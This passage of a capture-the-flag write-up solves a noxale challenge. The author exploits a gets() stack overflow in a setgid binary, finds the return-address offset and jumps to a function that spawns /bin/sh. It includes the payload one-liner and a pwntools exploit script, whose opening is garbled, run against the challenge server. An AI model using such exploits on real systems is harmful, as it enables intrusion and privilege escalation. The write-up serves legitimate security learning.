```
So this is an SSH service, let's try to connect with the username and password from the audio file:
```console
root@kali:/media/sf_CTFs/noxtis/ssh# ssh PI:EMAIL -p 1337
PI:EMAIL's password:
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.14.94-89.73.amzn2.x86_64 x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
Last login: Thu Feb 14 18:54:36 2019 from ***
Nahman@c70a485c41b8:~$ ls
authme  authme.c  cant_touch_this  topsecret
Nahman@c70a485c41b8:~$ ls -al
total 20
drwxr-xr-x 1 root        root          76 Feb  2 18:53 .
drwxr-xr-x 1 root        root          39 Feb  2 18:53 ..
-r-xr-sr-x 1 DarthNahman DarthNahman 7520 Jan 30 21:11 authme
-r--r--r-- 1 DarthNahman DarthNahman  910 Jan 30 21:11 authme.c
-r--r----- 1 DarthNahman DarthNahman   21 Jan 30 21:11 cant_touch_this
-r--r----- 1 DarthNahman DarthNahman  441 Feb  2 18:50 topsecret
Nahman@c70a485c41b8:~$ cat cant_touch_this
cat: cant_touch_this: Permission denied
Nahman@c70a485c41b8:~$ cat topsecret
cat: topsecret: Permission denied
Nahman@c70a485c41b8:~$ ./authme
Please insert the secret password:
asdf
Incorrect password!
```
Let's copy what we can to the local environment, e.g.:
```console
root@kali:/media/sf_CTFs/noxtis/ssh# scp -P 1337 PI:EMAIL:authme .
PI:EMAIL's password:
authme                                               100% 7520    30.5KB/s   00:00
```
We get an execuable and a source file:
```c
#include 
#include 
#include 
#include 
#define PASSWORD "CYBERCYBERCYBER"
#define BUFFER_SIZE 64
void getPassword();
void randomFunc();
int authenticated = 0;
int main()
{
	FILE* f = NULL;
	char buffer[BUFFER_SIZE] = {0};
	printf("Please insert the secret password:\n");
	getPassword();
	if(authenticated)
	{
		f = fopen("cant_touch_this", "r");
		if(!f)
		{
			printf("Error! Please contact the operators\n");
			exit(0);
		}
		fread(buffer, sizeof(char), BUFFER_SIZE - 1, f);
		fclose(f);
		printf("%s\n", buffer);
	}	
	return 0;
}
void getPassword()
{
	char buffer[BUFFER_SIZE] = {0};
	gets(buffer);
	if(!strncmp(buffer, PASSWORD, BUFFER_SIZE))
	{
		printf("Correct password!\n");
		authenticated = 1;
	}
	else
		printf("Incorrect password!\n");
}
void randomFunc()
{
	gid_t gid;
	gid = getegid();
	setresgid(gid, gid, gid);
	system("/bin/sh");
}
```
So now we know the password, let's try it:
```console
Nahman@c70a485c41b8:~$ ./authme
Please insert the secret password:
CYBERCYBERCYBER
Correct password!
Put your content here
```
Not very helpful. What does seem helpful is the buffer overflow in `getPassword`, where `gets` does not check the limit of the 64-byte buffer, allowing us to override the return address and jump to another location. That other location should be randomFunc which will spawn us a shell.
Let's use the `cyclic` tool to identify the exact offset of the return address, and `objdump` to find the address of `randomFunc`:
```console
root@kali:/media/sf_CTFs/noxtis/ssh# cyclic 100 | ./authme
Please insert the secret password:
Incorrect password!
Segmentation fault
root@kali:/media/sf_CTFs/noxtis/ssh# dmesg | grep authme
[ 8766.103359] authme[2360]: segfault at 61616174 ip 0000000061616174 sp 00000000ffce7040 error 14 in libc-2.28.so[f7d8c000+19000]
root@kali:/media/sf_CTFs/noxtis/ssh# cyclic -l 0x61616174
76
root@kali:/media/sf_CTFs/noxtis/ssh# objdump -d ./authme | grep randomFunc
08048708 :
```
Therefore, our input should be:
```console
python -c "print(('A' * 76) + '\x08\x87\x04\x08')"
```
But if we try this, we fail:
```console
root@kali:/media/sf_CTFs/noxtis/ssh# python -c "print(('A' * 76) + '\x08\x87\x04\x08')" | ./authme
Please insert the secret password:
Incorrect password!
Segmentation fault
```
The reason is that the stdin of the /bin/sh is the stdin of our program which is the output of our python program. The shell will try to read input data from there and then exit when no more input is available. 
So, in order to overcome that, we can use [this](https://security.stackexchange.com/questions/73878/program-exiting-after-executing-int-0x80-instruction-when-running-shellcode) neat trick:
```console
Nahman@c70a485c41b8:~$ python -c "print(('A' * 76) + '\x08\x87\x04\x08')" > /tmp/exploit.txt
Nahman@c70a485c41b8:~$ cat /tmp/exploit.txt
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Nahman@c70a485c41b8:~$ cat /tmp/exploit.txt - | ./authme
```
The `-` tells `cat` to allow interactive input via stdin after printing the content of the file.
An even shorter version of this, which does not require writing to a file, is:
```console
cat  /proc/sys/kernel/core_pattern")
	proc = process(EXE_PATH)
	payload = cyclic(100)
	send_payload(proc, payload)
	proc.wait()
	offset = cyclic_find(proc.corefile.eip)
	log.info("Overflow offset: {}".format(offset))
	return offset
parser = argparse.ArgumentParser()
parser.add_argument("-s", "--ssh", help="Connect via SSH", action="store_true")
args = parser.parse_args()
e = ELF(EXE_PATH)
log.info("Address of randomFunc(): 0x{:02X}".format(e.symbols["randomFunc"]))
offset = get_overflow_offset()
p = get_process(args.ssh)
payload = fit({offset: e.symbols["randomFunc"]})
send_payload(p, payload)
p.interactive()
```
Output:
```console
root@kali:/media/sf_CTFs/noxtis/ssh# python exploit.py -s
[*] '/media/sf_CTFs/noxtis/ssh/authme'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Address of randomFunc(): 0x8048708
[+] Starting local process './authme': pid 1883
[*] Process './authme' stopped with exit code -11 (SIGSEGV) (pid 1883)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/noxtis/ssh/core.1883'
    Arch:      i386-32-little
    EIP:       0x61616174
    ESP:       0xffd6eb20
    Exe:       '/media/sf_CTFs/noxtis/ssh/authme' (0x8048000)
    Fault:     0x61616174
[*] Overflow offset: 76
[+] Connecting to darthvaderfans.noxale.com on port 1337: Done
[*] PI:EMAIL:
    Distro    Unknown
    OS:       linux
    Arch:     amd64
    Version:  4.14.94
    ASLR:     Enabled
[+] Starting remote process './authme' on darthvaderfans.noxale.com: pid 6046
[*] Switching to interactive mode
Incorrect password!
$ $ cat topsecret
ï»¿You used the magic powers of the shell with the root permissions and banished Nahman to the realm of QA,
for eternity. The secret intel has been recovered and one of Ruhani's nails was broken in the meni-pedi.
Israel's future has been saved, thanks to you. Congratulations!
https://www.youtube.com/watch?v=04854XqcfCY
Fill this google form for eternal fame and glory (and further communication):
https://goo.gl/forms/P594dcnl8eqgpX1Q2
$ $ exit
$
[*] Got EOF while reading in interactive
$
[*] Stopped remote process 'authme' on darthvaderfans.noxale.com (pid 6046)
[*] Got EOF while sending in interactive
```
And we're done. Thumbs-up for noxale for a fun CTF!